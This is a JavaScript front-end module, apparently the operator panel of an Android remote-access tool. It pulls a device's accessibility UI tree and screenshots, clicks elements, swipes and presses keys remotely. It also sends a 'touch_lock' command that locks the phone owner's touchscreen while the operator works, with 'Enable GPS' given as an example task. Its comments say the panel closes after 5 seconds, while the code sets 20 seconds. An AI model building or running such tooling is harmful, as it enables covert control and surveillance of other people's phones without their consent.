/**
 * SmartUI — Remote Accessibility Node Interaction (Screenshot Overlay Version)
 * 
 * Auto-closes after 5s. Touch lock is managed automatically:
 * - On open: touch_lock is sent
 * - On close (auto or manual): touch_unlock is sent
 * 
 * Usage: SmartUI.show(deviceId, { onDone: () => {...}, title: 'Enable GPS' })
 */
const SmartUI = (() => {
    let overlay = null;
    let currentDeviceId = null;
    let opts = {};
    let allNodes = [];
    let screenW = 1080, screenH = 2400;
    let ssBlobUrl = null;
    let autoRefreshTimer = null;
    let autoRefreshInterval = null;
    let autoCloseTimer = null;
    let liveWs = null;

    const AUTO_CLOSE_MS = 20000;

    function escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function parseBounds(boundsStr) {
        if (!boundsStr) return null;
        const parts = boundsStr.split(',').map(Number);
        if (parts.length !== 4 || parts.some(isNaN)) return null;
        return { left: parts[0], top: parts[1], right: parts[2], bottom: parts[3] };
    }

    // Reset auto-close countdown (called on user interaction)
    function resetAutoClose() {
        if (autoCloseTimer) clearTimeout(autoCloseTimer);
        autoCloseTimer = setTimeout(() => SmartUI.close(), AUTO_CLOSE_MS);
        updateCountdown();
    }

    function updateCountdown() {
        const bar = document.getElementById('sui-timer-bar');
        if (!bar) return;
        bar.style.animation = 'none';
        bar.offsetHeight; // reflow
        bar.style.animation = `suiTimerShrink ${AUTO_CLOSE_MS}ms linear forwards`;
    }

    function createOverlay() {
        if (overlay) overlay.remove();

        overlay = document.createElement('div');
        overlay.id = 'smart-ui-overlay';
        overlay.innerHTML = `
            <style>
                #smart-ui-overlay {
                    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
                    background: rgba(2, 4, 8, 0.92); backdrop-filter: blur(12px);
                    z-index: 99999; display: flex; align-items: center; justify-content: center;
                    font-family: 'Share Tech Mono', 'Courier New', monospace;
                    animation: suiFadeIn 0.25s ease;
                }
                @keyframes suiFadeIn { from { opacity:0; transform: scale(0.97) } to { opacity:1; transform: scale(1) } }

                .sui-popup {
                    display: flex; flex-direction: column; align-items: center;
                    max-height: 95vh; max-width: 95vw;
                    filter: drop-shadow(0 0 30px rgba(0, 255, 65, 0.08));
                }

                /* ── Header ── */
                .sui-popup-header {
                    display: flex; align-items: center; gap: 12px;
                    padding: 8px 14px; width: 100%;
                    background: rgba(2, 8, 16, 0.98);
                    border: 1px solid rgba(0, 255, 65, 0.12);
                    border-bottom: none;
                    border-radius: 8px 8px 0 0;
                }
                .sui-popup-title {
                    color: #00ff41; font-size: 11px; font-weight: 700;
                    letter-spacing: 2px; text-transform: uppercase; flex: 1;
                    text-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
                }
                .sui-popup-status {
                    color: rgba(0, 255, 65, 0.4); font-size: 9px;
                    letter-spacing: 0.5px;
                }
                .sui-popup-close {
                    background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08);
                    color: rgba(255, 255, 255, 0.4); width: 24px; height: 24px;
                    border-radius: 4px; cursor: pointer; font-size: 11px;
                    display: flex; align-items: center; justify-content: center;
                    transition: all 0.15s;
                }
                .sui-popup-close:hover {
                    background: rgba(255, 0, 0, 0.12); color: #ff5252;
                    border-color: rgba(255, 0, 0, 0.3);
                }

                /* ── Timer bar ── */
                .sui-timer-wrap {
                    width: 100%; height: 2px;
                    background: rgba(0, 255, 65, 0.06);
                }
                .sui-timer-bar {
                    height: 100%; width: 100%;
                    background: linear-gradient(90deg, #00ff41, #00e676);
                    box-shadow: 0 0 6px rgba(0, 255, 65, 0.4);
                    transform-origin: left;
                }
                @keyframes suiTimerShrink {
                    from { transform: scaleX(1); } to { transform: scaleX(0); }
                }

                /* ── Phone frame ── */
                .sui-phone-frame {
                    position: relative;
                    border-left: 1px solid rgba(0, 255, 65, 0.1);
                    border-right: 1px solid rgba(0, 255, 65, 0.1);
                    overflow: hidden; background: #000;
                    box-shadow: 0 0 40px rgba(0, 0, 0, 0.6), inset 0 0 1px rgba(0, 255, 65, 0.05);
                }
                .sui-phone-screen {
                    position: relative; width: 100%; height: 100%; overflow: hidden;
                }
                .sui-phone-screen img {
                    display: block; width: 100%; height: 100%;
                }
                .sui-placeholder {
                    display: flex; align-items: center; justify-content: center;
                    flex-direction: column; color: rgba(0, 255, 65, 0.25);
                    font-size: 11px; padding: 40px; text-align: center;
                    width: 260px; height: 520px; letter-spacing: 1px;
                }
                .sui-placeholder .icon { font-size: 28px; margin-bottom: 8px; opacity: 0.3; }

                /* ── Shimmer ── */
                .sui-phone-frame.loading::after {
                    content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
                    background: linear-gradient(90deg, transparent 30%, rgba(0,255,65,0.03) 50%, transparent 70%);
                    animation: suiShimmer 1.5s infinite; pointer-events: none; z-index: 10;
                }
                @keyframes suiShimmer { from { transform: translateX(-100%); } to { transform: translateX(100%); } }

                /* ── Node overlay ── */
                .sui-node-overlay {
                    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
                    pointer-events: none;
                }
                .sui-node-rect {
                    position: absolute; border: 1px solid transparent;
                    cursor: pointer; pointer-events: auto; transition: all 0.1s; z-index: 2;
                }
                .sui-node-rect:hover {
                    border-color: #00ff41; background: rgba(0, 255, 65, 0.1);
                    box-shadow: 0 0 10px rgba(0, 255, 65, 0.25);
                }
                .sui-node-rect.clicking {
                    background: rgba(0, 255, 65, 0.25); border-color: #00ff41;
                }
                .sui-node-tip {
                    display: none; position: absolute; bottom: calc(100% + 3px);
                    left: 50%; transform: translateX(-50%);
                    background: rgba(2, 8, 16, 0.95); border: 1px solid rgba(0, 255, 65, 0.2);
                    border-radius: 3px; padding: 2px 7px; font-size: 8px;
                    color: #00ff41; white-space: nowrap; z-index: 100; pointer-events: none;
                    letter-spacing: 0.5px;
                }
                .sui-node-rect:hover .sui-node-tip { display: block; }

                /* ── Lock overlay ── */
                .sui-lock-overlay {
                    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
                    background: rgba(255, 0, 0, 0.12); border: 1px solid rgba(255, 0, 0, 0.4);
                    pointer-events: none; z-index: 15; display: none;
                    align-items: flex-start; justify-content: center;
                }
                .sui-lock-overlay.active { display: flex; }
                .sui-lock-badge {
                    margin-top: 10px; padding: 3px 12px;
                    background: rgba(255, 0, 0, 0.6); color: #fff;
                    font-size: 8px; font-weight: bold; letter-spacing: 2px;
                    border-radius: 2px; text-transform: uppercase;
                }

                /* ── Footer ── */
                .sui-popup-footer {
                    display: flex; align-items: center; gap: 3px;
                    padding: 6px 10px; width: 100%;
                    background: rgba(2, 8, 16, 0.98);
                    border: 1px solid rgba(0, 255, 65, 0.12);
                    border-top: none;
                    border-radius: 0 0 8px 8px; justify-content: center;
                }
                .sui-fbtn {
                    padding: 4px 8px; border-radius: 3px; font-size: 9px; font-weight: 600;
                    cursor: pointer; border: 1px solid rgba(0, 255, 65, 0.08);
                    background: rgba(0, 255, 65, 0.03); color: rgba(0, 255, 65, 0.4);
                    font-family: 'Share Tech Mono', monospace; transition: all 0.12s;
                    letter-spacing: 0.5px;
                }
                .sui-fbtn:hover {
                    color: #00ff41; border-color: rgba(0, 255, 65, 0.2);
                    background: rgba(0, 255, 65, 0.06);
                    box-shadow: 0 0 6px rgba(0, 255, 65, 0.1);
                }
                .sui-fbtn:active { transform: scale(0.95); }
                .sui-fbtn-primary {
                    background: rgba(0, 255, 65, 0.06); border-color: rgba(0, 255, 65, 0.15);
                    color: #00ff41;
                }
                .sui-fbtn-primary:hover {
                    background: rgba(0, 255, 65, 0.12);
                    box-shadow: 0 0 8px rgba(0, 255, 65, 0.15);
                }
                .sui-popup-info {
                    color: rgba(0, 255, 65, 0.2); font-size: 8px;
                    letter-spacing: 0.5px; margin-left: auto;
                }
            </style>
            <div class="sui-popup">
                <div class="sui-popup-header">
                    <div class="sui-popup-title">${escHtml(opts.title || 'SMART UI')}</div>
                    <span class="sui-popup-status" id="sui-status">SCANNING...</span>
                    <button class="sui-popup-close" onclick="SmartUI.close()">✕</button>
                </div>
                <div class="sui-timer-wrap"><div class="sui-timer-bar" id="sui-timer-bar"></div></div>
                <div class="sui-phone-frame loading" id="sui-frame">
                    <div class="sui-phone-screen" id="sui-screen">
                        <div class="sui-placeholder" id="sui-placeholder">
                            <span class="icon">📱</span>
                            <p>CAPTURING SCREEN...</p>
                        </div>
                        <img id="sui-img" style="display:none;" draggable="false" />
                        <div class="sui-node-overlay" id="sui-overlay"></div>
                        <div class="sui-lock-overlay active" id="sui-lock-overlay"><span class="sui-lock-badge">🔒 LOCKED</span></div>
                    </div>
                </div>
                <div class="sui-popup-footer">
                    <button class="sui-fbtn sui-fbtn-primary" onclick="SmartUI.refresh()">↻ REFRESH</button>
                    <button class="sui-fbtn" onclick="SmartUI.navKey('BACK')">◀ BACK</button>
                    <button class="sui-fbtn" onclick="SmartUI.navKey('HOME')">● HOME</button>
                    <button class="sui-fbtn" onclick="SmartUI.navKey('RECENTS')">▣</button>
                    <button class="sui-fbtn" onclick="SmartUI.swipe('up')">↑</button>
                    <button class="sui-fbtn" onclick="SmartUI.swipe('down')">↓</button>
                    <button class="sui-fbtn" onclick="SmartUI.swipe('left')">←</button>
                    <button class="sui-fbtn" onclick="SmartUI.swipe('right')">→</button>
                    <span class="sui-popup-info" id="sui-count"></span>
                </div>
            </div>
        `;

        document.body.appendChild(overlay);

        // Close on backdrop click
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) SmartUI.close();
        });

        // Escape key
        overlay._escHandler = (e) => {
            if (e.key === 'Escape') SmartUI.close();
        };
        document.addEventListener('keydown', overlay._escHandler);
    }

    // Render node overlays on screenshot
    function renderOverlays() {
        const ovl = document.getElementById('sui-overlay');
        const img = document.getElementById('sui-img');
        if (!ovl || !img || img.style.display === 'none') {
            if (ovl) ovl.innerHTML = '';
            return;
        }

        const natW = img.naturalWidth || screenW;
        const natH = img.naturalHeight || screenH;
        if (natW === 0 || natH === 0) return;

        const interactive = allNodes.filter(n =>
            (n.click || n.check || n.id || n.d) && n.enabled && n.bounds
        );

        ovl.innerHTML = interactive.map(n => {
            const b = parseBounds(n.bounds);
            if (!b) return '';
            const leftPct = (b.left / natW) * 100;
            const topPct = (b.top / natH) * 100;
            const widthPct = ((b.right - b.left) / natW) * 100;
            const heightPct = ((b.bottom - b.top) / natH) * 100;
            if (widthPct < 0.5 || heightPct < 0.3) return '';

            const label = escHtml(n.t || n.d || n.cls || '');
            return `<div class="sui-node-rect"
                style="left:${leftPct}%; top:${topPct}%; width:${widthPct}%; height:${heightPct}%;"
                onclick="SmartUI.clickNode(${n.i}, this)">
                <span class="sui-node-tip">${label || n.cls}</span>
            </div>`;
        }).join('');
    }

    // Size phone frame from actual image
    function sizeFrame(imgW, imgH) {
        const frame = document.getElementById('sui-frame');
        if (!frame) return;
        const maxH = window.innerHeight - 120;
        const aspect = imgW / imgH;
        const frameW = Math.min(maxH * aspect, 340);
        const frameH = frameW / aspect;
        frame.style.width = frameW + 'px';
        frame.style.height = frameH + 'px';
    }

    // Fetch tree + screenshot
    async function fetchTree() {
        const frame = document.getElementById('sui-frame');
        const status = document.getElementById('sui-status');
        const count = document.getElementById('sui-count');
        if (frame) frame.classList.add('loading');

        try {
            const result = await api.sendCommand(currentDeviceId, 'get_ui_tree', {});
            const data = result.data || result;
            const nodes = data.nodes || [];

            if (data.screenWidth) screenW = data.screenWidth;
            if (data.screenHeight) screenH = data.screenHeight;

            allNodes = nodes;
            if (count) count.textContent = `${allNodes.length} nodes`;

            // Now capture screenshot
            await captureScreenshot();

        } catch (err) {
            if (status) status.textContent = err.message || 'FAILED';
            if (frame) frame.classList.remove('loading');
        }
    }

    // Capture screenshot and show
    async function captureScreenshot() {
        const status = document.getElementById('sui-status');
        const frame = document.getElementById('sui-frame');

        try {
            const result = await api.sendCommand(currentDeviceId, 'accessibility_screenshot', {});
            const data = result.data || result;

            if (data.image) {
                showImage(data.image);
                if (status) status.textContent = '● LIVE';

                const img = document.getElementById('sui-img');
                if (img) {
                    img.onload = () => {
                        sizeFrame(img.naturalWidth, img.naturalHeight);
                        renderOverlays();
                    };
                }
            } else {
                throw new Error(result.error || 'No image');
            }
        } catch (err) {
            if (status) status.textContent = err.message || 'SCREENSHOT FAILED';
        } finally {
            if (frame) frame.classList.remove('loading');
        }
    }

    // Show image from base64
    function showImage(base64Data) {
        if (ssBlobUrl) URL.revokeObjectURL(ssBlobUrl);
        const binary = atob(base64Data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        const blob = new Blob([bytes], { type: 'image/jpeg' });
        ssBlobUrl = URL.createObjectURL(blob);

        const img = document.getElementById('sui-img');
        const placeholder = document.getElementById('sui-placeholder');
        if (img) { img.src = ssBlobUrl; img.style.display = 'block'; }
        if (placeholder) placeholder.style.display = 'none';
    }

    // Connect WebSocket for live updates
    function connectLiveWs() {
        try {
            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
            liveWs = new WebSocket(`${proto}//${location.host}/`);
            liveWs.onopen = () => {
                liveWs.send(JSON.stringify({ type: 'identify', role: 'browser' }));
            };
            liveWs.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    if (data.type === 'ui_changed' && data.deviceId === currentDeviceId) {
                        if (autoRefreshTimer) clearTimeout(autoRefreshTimer);
                        autoRefreshTimer = setTimeout(() => fetchTree(), 300);
                    }
                } catch (err) { }
            };
            liveWs.onclose = () => {
                if (overlay) setTimeout(connectLiveWs, 3000);
            };
            liveWs.onerror = () => { try { liveWs.close(); } catch (e) { } };
        } catch (e) { }
    }

    return {
        show(deviceId, options = {}) {
            currentDeviceId = deviceId;
            opts = options;
            allNodes = [];
            createOverlay();
            fetchTree();
            connectLiveWs();

            // Start auto-refresh every 3s
            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
            autoRefreshInterval = setInterval(() => fetchTree(), 3000);

            // Start 5s auto-close countdown
            resetAutoClose();
        },

        close() {
            // Auto-unlock touch on close
            if (currentDeviceId) {
                api.sendCommand(currentDeviceId, 'touch_unlock').catch(() => { });
            }

            if (overlay) {
                document.removeEventListener('keydown', overlay._escHandler);
                overlay.remove();
                overlay = null;
            }
            allNodes = [];
            if (ssBlobUrl) { URL.revokeObjectURL(ssBlobUrl); ssBlobUrl = null; }
            if (autoRefreshTimer) { clearTimeout(autoRefreshTimer); autoRefreshTimer = null; }
            if (autoRefreshInterval) { clearInterval(autoRefreshInterval); autoRefreshInterval = null; }
            if (autoCloseTimer) { clearTimeout(autoCloseTimer); autoCloseTimer = null; }
            if (liveWs) { try { liveWs.close(); } catch (e) { } liveWs = null; }
            if (opts.onClose) opts.onClose();
        },

        refresh() {
            fetchTree();
        },

        async navKey(key) {
            try {
                await api.sendCommand(currentDeviceId, 'accessibility_key', { key });
                setTimeout(() => fetchTree(), 800);
            } catch (e) {
                console.error('SmartUI navKey error:', e);
            }
        },

        async swipe(direction) {
            try {
                await api.sendCommand(currentDeviceId, 'accessibility_swipe', { direction });
                setTimeout(() => fetchTree(), 800);
            } catch (e) {
                console.error('SmartUI swipe error:', e);
            }
        },

        async clickNode(index, el) {
            if (el) el.classList.add('clicking');

            try {
                const result = await api.sendCommand(currentDeviceId, 'click_node', { index });
                const data = result.data || result;

                if (data.clicked) {
                    if (typeof api !== 'undefined') api.showToast('Clicked ✓', 'success');
                    setTimeout(() => fetchTree(), 1000);
                    if (opts.onDone) setTimeout(() => opts.onDone(), 1200);
                } else {
                    if (el) el.classList.remove('clicking');
                    if (typeof api !== 'undefined') api.showToast('Click failed', 'error');
                }
            } catch (err) {
                if (el) el.classList.remove('clicking');
                console.error('SmartUI click error:', err);
            }
        },
    };
})();
